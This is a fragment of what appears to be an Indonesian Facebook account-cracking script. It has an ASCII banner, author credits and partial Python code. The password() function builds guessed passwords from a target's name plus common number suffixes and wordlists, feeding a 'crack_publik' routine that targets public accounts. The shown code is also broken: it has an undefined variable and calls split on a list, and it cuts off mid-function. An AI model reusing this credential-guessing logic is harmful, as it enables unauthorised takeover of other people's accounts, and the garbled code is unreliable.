...
| (___  _   _  __ _| |_ _ _ | |     ___  _ __ ___
 \___ \| | | |/ _` |  _| | || |    / _ \| '_ ` _ \
 ____) | |_| | (_| | | | | || |___| (_) | | | | | |
|_____/ \__, |\__,_|_| |_|_(_)_____\___/|_| |_| |_|
         __/ |
        |___/
®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®
...
{❤} Istri Author : Widiya Nasution

{❤} Facebook : www.facebook.com/fikritampan305
...
def menu(__widiya__):
    ...
    except (KeyError,IOError):print('\n[!] Token Invalid');os.system('rm -rf token.txt');login(__widiya_)
    except requests.exceptions.ConnectionError:print('\n[!] Koneksi Bermasalah');os.system('rm -rf token.txt');login(__widiya__)
    print('[•] Nama : %s'%(n));print('[•] ID : %s'%(i));crack_publik(__widiya_)
...
def password(_widiya_):
    _syafii_=[];ps = open('pass.txt','r').read();pp = open('passangka.txt','r').read()
    for i in _widiya_.split(" "):  
        i=i.lower()
        if len(i)<3:continue
        elif len(i)==3 or len(i)==4 or len(i)==5:_syafii_.append(i+"123");_syafii_.append(i+"12345")
        else:_syafii_.append(i);_syafii_.append(i+"123");_syafii_.append(i+"12345")
    if pp in ['',' ','  ']:pass
    else:
        for i in _syafii_.split(" "):  
            i=i.lower()
            for x in pp.split(','):_syafii_.append(i+x)
    if ps in ['',' ','  ']:pass
    else:
        for z in ps.split(','):_syafii_.append(z)
    _syafii_.append(_widiya_.lower())
    return _syafii_
def cek_recode():
    try :
